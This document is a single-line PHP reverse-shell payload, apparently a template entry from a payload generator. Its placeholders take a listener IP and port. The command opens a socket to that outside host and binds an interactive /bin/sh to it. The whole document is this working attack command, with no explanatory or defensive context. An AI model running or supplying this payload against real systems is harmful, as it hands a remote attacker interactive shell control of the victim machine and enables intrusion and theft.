php -r '$sock=fsockopen("{{ host.ip }}",{{ host.port }});exec("/bin/sh -i <&3 >&3 2>&3");'
